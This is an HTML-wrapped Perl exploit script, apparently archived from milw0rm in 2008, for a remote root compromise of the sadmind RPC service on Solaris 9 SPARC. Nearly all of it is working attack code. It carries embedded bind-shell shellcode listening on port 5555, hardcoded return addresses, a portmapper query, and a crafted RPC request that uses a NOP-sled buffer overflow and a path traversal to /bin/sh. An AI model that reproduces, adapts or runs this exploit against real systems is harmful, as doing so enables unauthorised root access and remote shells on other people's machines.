<html><head><title>Solaris 9 [UltraSPARC] sadmind Remote Root Exploit</title></head><pre>#!/usr/bin/perl
# holygrail2                                                                      #
#---------------------------------------------------------------------------------#
# SunOS 5.9 [UltraSPARC] sadmind Remote Root Exploit by KingCope in 2008          #
#                                                                                 #
# Most of work was shamelessy ripped from HD-Moore  and RISE-Security exploits!!! #
# Bug found by RISE-Security.                                                     #
# Sparc exploit by KingCope [kcope2@googlemail.com]                               #
# Maybe I will extend this to Solaris 8/10/11 in futura ??                        #
# thanks to alex,andi,adize ...                                                   #
#                                                                                 #
###################################################################################

use strict;
use POSIX;
use IO::Socket;
use IO::Select;

print &quot;holygrail2 vs. SunOS 5.9 sadmind\nby kcope in 2008\nbinds a shell to port 5555\n&quot;;
my $host = $ARGV[0];

if ($host eq &quot;&quot;) {
	print &quot;usage: perl holygrail2.pl &lt;address&gt;\n&quot;;
	exit(-1);
}

# solaris_sparc_bind -  LPORT=5555 Size=232 Encoder=Sparc http://metasploit.com
my $payload =
&quot;\x23\x32\xde\xd7\xa2\x14\x62\x6f\x20\xbf\xff\xff\x20\xbf\xff\xff&quot;.
&quot;\x7f\xff\xff\xff\xea\x03\xe0\x20\xaa\x9d\x40\x11\xea\x23\xe0\x20&quot;.
&quot;\xa2\x04\x40\x15\x81\xdb\xe0\x20\x12\xbf\xff\xfb\x9e\x03\xe0\x04&quot;.
&quot;\x57\x50\xfe\x68\xff\xb6\xde\x77\x69\xad\xde\x7c\x01\xcb\x1e\x89&quot;.
&quot;\xbb\xfc\xbe\x8f\x2b\xec\x9e\x8d\xce\x1c\xfe\x77\x5f\xcc\xdf\x7f&quot;.
&quot;\x8f\xce\xa0\x87\x11\x10\xdf\xf2\xf1\x04\xfe\x4f\x11\x06\xbe\x5f&quot;.
&quot;\x11\x6b\x7e\x6b\x03\x4f\x21\x83\xb7\x80\x01\xb3\x35\xb0\x61\x5b&quot;.
&quot;\xa8\x60\x42\x93\x1b\x83\x3d\x5b\x09\x94\x62\x9a\xaf\x84\x42\x75&quot;.
&quot;\x3e\x74\xa3\x8d\x91\x77\x1c\x75\x83\x62\x23\x8c\x37\x80\xe3\x87&quot;.
&quot;\xb5\xb4\xc3\x7d\x28\x65\x24\x89\x9b\xa6\x9b\x71\x8f\xb8\xc4\x82&quot;.
&quot;\x3d\xa9\x24\x8d\xd5\x6b\x84\x8c\x54\x7b\xe4\xb0\xc9\xab\xc4\xc4&quot;.
&quot;\xf8\xf3\xfb\x28\x2d\x0f\xbb\x28\x59\x15\x04\xc3\x40\x21\x5c\x49&quot;.
&quot;\x22\x22\x7c\x03\x01\x41\xa2\x01\xd5\x75\xfb\xa5\x47\x5a\x5b\xcd&quot;.
&quot;\x87\xa6\x24\x3d\x97\xfa\xe4\x45\xd7\xde\xa4\x49\x5a\x30\xfb\x8a&quot;.
&quot;\xcb\xe0\xdb\xe4\xec\x01\x1b\xf4&quot;;

my $patchaddr = pack(&quot;N&quot;, 0xffbf83d8);
my $retaddr = pack(&quot;N&quot;, 0xffbf88e0);

sub nonblock {
    my ($fd) = @_;
    my $flags = fcntl($fd, F_GETFL,0);
    fcntl($fd, F_SETFL, $flags|O_NONBLOCK);
}

sub rpc_read {
    my ($s) = @_;
    my $sel = IO::Select-&gt;new($s);
    my $res;
    my @fds = $sel-&gt;can_read(4);
    foreach (@fds) { $res .= &lt;$s&gt;; }
    return $res;
}

sub rpc_getport {
    my ($target_host, $target_port, $prog, $vers) = @_;
    
    my $s = rpc_socket($target_host, $target_port);

    my $portmap_req =
        
        pack(&quot;L&quot;, rand() * 0xffffffff) . # XID
        &quot;\x00\x00\x00\x00&quot;.              # Call
        &quot;\x00\x00\x00\x02&quot;.              # RPC Version
        &quot;\x00\x01\x86\xa0&quot;.              # Program Number  (PORTMAP)
        &quot;\x00\x00\x00\x02&quot;.              # Program Version (2)
        &quot;\x00\x00\x00\x03&quot;.              # Procedure (getport)
        (&quot;\x00&quot; x 16).                   # Credentials and Verifier
        pack(&quot;N&quot;, $prog) .
        pack(&quot;N&quot;, $vers).
        pack(&quot;N&quot;, 0x11).                 # Protocol: UDP
        pack(&quot;N&quot;, 0x00);                 # Port: 0

    print $s $portmap_req;

    my $r = rpc_read($s);
    close ($s);
    
    if (length($r) == 28) 
    { 
        my $prog_port = unpack(&quot;N&quot;,substr($r, 24, 4));
        return($prog_port); 
    }
    
    return undef;
}

sub rpc_socket {
    my ($target_host, $target_port) = @_;
    my $s = IO::Socket::INET-&gt;new
    (
        PeerAddr =&gt; $target_host, 
        PeerPort =&gt; $target_port,
        Proto    =&gt; &quot;udp&quot;,
        Type     =&gt; SOCK_DGRAM
    );

    if (! $s)
    {
        print &quot;\nError: could not create socket to target: $!\n&quot;;
        exit(0);
    }

    select($s); $|++;
    select(STDOUT); $|++;
    nonblock($s);
    return($s);
}

sub rpc_sadmin_expl {
    my ($hostname, $command, $first) = @_;
    my $packed_host = $hostname . (&quot;\x00&quot; x (59 - length($hostname)));    
    
    my $rpc =
        pack(&quot;L&quot;, rand() * 0xffffffff) . # XID
        &quot;\x00\x00\x00\x00&quot;.              # Call
        &quot;\x00\x00\x00\x02&quot;.              # RPC Version
        &quot;\x00\x01\x87\x88&quot;.              # Program Number  (SADMIND)
        &quot;\x00\x00\x00\x0a&quot;.              # Program Version (10)
        &quot;\x00\x00\x00\x01&quot;.              # Procedure
        &quot;\x00\x00\x00\x01&quot;;              # Credentials (UNIX)
                                         # Auth Length is filled in

    # pad it up to multiples of 4
    my $rpc_hostname = $hostname;
    while (length($rpc_hostname) % 4 != 0) { $rpc_hostname .= &quot;\x00&quot; }
    
    my $rpc_auth =
        # Time Stamp
        pack(&quot;N&quot;, time() + 20001) .

        # Machine Name
        pack(&quot;N&quot;, length($hostname)) . $rpc_hostname .

        &quot;\x00\x00\x00\x00&quot;.              # UID = 0
        &quot;\x00\x00\x00\x00&quot;.              # GID = 0
        &quot;\x00\x00\x00\x00&quot;;              # No Extra Groups  


    $rpc .= pack(&quot;N&quot;, length($rpc_auth)) . $rpc_auth . (&quot;\x00&quot; x 8);

    my $fp = pack(&quot;N&quot;, 0xffbf9108);
    my $buf1 = &quot;\x90&quot; x (2050-length($payload)-500) . $payload . &quot;\x90\x90&quot; . &quot;\x90&quot; x 500 . &quot;CC&quot; . $fp . $fp . $retaddr x 100;

    if ($first eq 1) {
	$buf1 = &quot;\x90&quot; x 50;
    }

    while (length($buf1) % 4 != 0) { $buf1 .= &quot;\x00&quot; }

    my $header =
    
    # Another Time Stamp
    reverse(pack(&quot;L&quot;, time() + 20005)) .

    &quot;\x00\x07\x45\xdf&quot;.
    
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    &quot;\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04&quot;.
    
    &quot;\x7f\x00\x00\x01&quot;.                 # 127.0.0.1
    &quot;\x00\x01\x87\x88&quot;.                 # SADMIND
    
    &quot;\x00\x00\x00\x0a\x00\x00\x00\x04&quot;.
    
    &quot;\x7f\x00\x00\x01&quot;.                 # 127.0.0.1
    &quot;\x00\x01\x87\x88&quot;.                 # SADMIND

    &quot;\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    &quot;\x00\x00\x00\x00&quot;.

    &quot;\x00\x00\x00\x3b&quot;. $packed_host.

    &quot;\x00\x00\x00\x00\x06&quot; . &quot;system&quot;.
    
    &quot;\x00\x00\x00\x00\x00\x15&quot;. &quot;../../../../../bin/sh&quot;. &quot;\x00\x00\x00&quot;;
    
    # Append Body Length ^-- Here

    my $body = 
    &quot;\x00\x00\x00\x0e&quot;. &quot;ADM_FW_VERSION&quot;.
    &quot;\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00&quot;.
    &quot;\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    
    &quot;\x00\x00\x00\x08&quot;. &quot;ADM_LANG&quot;.
    &quot;\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00&quot;.
    &quot;\x00\x01&quot;. &quot;C&quot; . 
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    
    &quot;\x00\x00\x00\x0d&quot;. &quot;ADM_REQUESTID&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11&quot;.
    &quot;00009:000000000:0&quot;.&quot;\x00\x00\x00&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;.

    &quot;\x00\x00\x00\x09&quot;. &quot;ADM_CLASS&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07&quot;.
    &quot;\x00\x00\x00\x06&quot; . &quot;system&quot; .
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    
    
    &quot;\x00\x00\x00\x0e&quot; . &quot;ADM_CLASS_VERS&quot; .
    &quot;\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04&quot;.
    &quot;\x00\x00\x00\x03&quot;. &quot;2.1&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    
    
    &quot;\x00\x00\x00\x0a&quot; . &quot;ADM_METHOD&quot; . 
    &quot;\x00\x00\x00\x00\x00\x09&quot; . pack(&quot;N&quot;, length($buf1)+1) . pack(&quot;N&quot;, length($buf1)) . $buf1 . 
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    
    &quot;\x00\x00\x00\x08&quot;. &quot;ADM_HOST&quot; .
    &quot;\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b&quot;.
    $packed_host.

    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    &quot;\x00\x00\x00\x0f&quot;. &quot;ADM_CLIENT_HOST&quot;.
    &quot;\x00\x00\x00\x00\x09&quot;.
    
    pack(&quot;N&quot;, length($hostname) + 1) .
    pack(&quot;N&quot;, length($hostname)) .
    $rpc_hostname .
    &quot;\x00\x00\x00\x00&quot;. &quot;\x00\x00\x00\x00&quot;.
    
    &quot;\x00\x00\x00\x11&quot; . &quot;ADM_CLIENT_DOMAIN&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00&quot;.
    &quot;\x00\x00\x00\x00\x00\x00&quot;.
    
    &quot;\x00\x00\x00\x11&quot; . &quot;ADM_TIMEOUT_PARMS&quot;.
    &quot;\x00\x00\x00\x00\x00&quot;.
    &quot;\x00\x09\x00\x00\x00\x1c&quot;.
    &quot;\x00\x00\x00\x1b&quot; . &quot;TTL=0 PTO=20 PCNT=2 PDLY=30&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    
    
    &quot;\x00\x00\x00\x09&quot; . &quot;ADM_FENCE&quot; .
    &quot;\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
    &quot;\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00&quot;.
    &quot;\x00\x00\x03\x00\x00\x00\x02&quot; . &quot;-c&quot; .
    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00&quot;.
    &quot;\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00&quot;.

    $command . (&quot;\x00&quot; x (512 - length($command))).

    &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10&quot;.
    &quot;netmgt_endofargs&quot;;

    my $res = $rpc . $header . pack(&quot;N&quot;, (length($body) + 4 + length($header)) - 330) . $body;

    return($res);

}

$|=1;

my $portmap = &quot;111&quot;;
for (my $i=1;$i&lt;3;$i++) {
my $target_port = rpc_getport($host, $portmap, 100232, 10);
if (! $target_port)
{
    print STDERR &quot;Error: could not determine port used by sadmind\n&quot;;
    exit(0);
}

my $s = rpc_socket($host, $target_port);
my $x = rpc_sadmin_expl(&quot;localhost&quot;, &quot;foo&quot;, $i);
print $s $x;
my $r = rpc_read($s);
close ($s);
}

# milw0rm.com [2008-10-19]</pre></html>